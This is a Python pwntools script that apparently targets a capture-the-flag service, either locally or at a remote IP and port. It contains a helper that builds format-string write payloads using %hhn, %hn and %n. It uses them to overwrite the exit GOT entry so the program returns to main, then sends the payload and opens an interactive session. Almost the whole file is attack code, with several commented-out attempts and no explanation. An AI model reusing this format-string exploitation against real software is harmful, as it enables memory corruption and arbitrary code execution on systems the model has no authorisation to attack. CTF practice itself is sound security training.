from pwn import *
from sys import argv
from time import sleep

context.arch = 'amd64'

host = '127.0.0.1'
port = 8888
if len(argv) == 2 and argv[1] == 'remote':
    host = '35.201.132.60'
    port = 56746
r = remote(host, port)

def fmt(prev, val, idx, byte=1):
    ret = ''
    if prev < val:
        ret += '%' + str(val-prev) + 'c'
    elif prev == val:
        ret += ''
    else:
        ret += '%' + str(256**byte + val - prev) + 'c'
    ret += '%' + str(idx)
    if byte == 1:
        ret += '$hhn'
    elif byte == 2:
        ret += '$hn'
    elif byte == 4:
        ret += '$n'
    return ret

input('debug')

id_1 = 0x1b  # +0xa8
id_2 = 0x35  # +0x178
id_3 = 0x20a # +0x1300

guess_id2_addr = 0x88

# overwrite exit to main
# payload = '%' + str(0x100) + 'c%' + str(id_2) + '$n'
exit_got = 0x600ff8
main = 0x00000000004008cf

payload = ''
prev = 0
# payload = fmt(0, 0x88, id_1, 1)
payload = fmt(0, 0xff8, id_2, 4)
# prev += 0xff8
# payload += fmt(prev&0xff, 0x04, id_1, 1)
# payload += fmt(0xff8, 0x600, id_1, 2)
# payload = fmt(0, 0x600ff8, id_1, 4)
# prev += 0x600ff8
# payload += fmt(prev&0xff, 0x08, id_1, 1)
# prev += 0x08
# payload += fmt(prev&0xffffffff, 0x0, id_2, 4)
print(len(payload))
r.sendline(payload)

r.interactive()
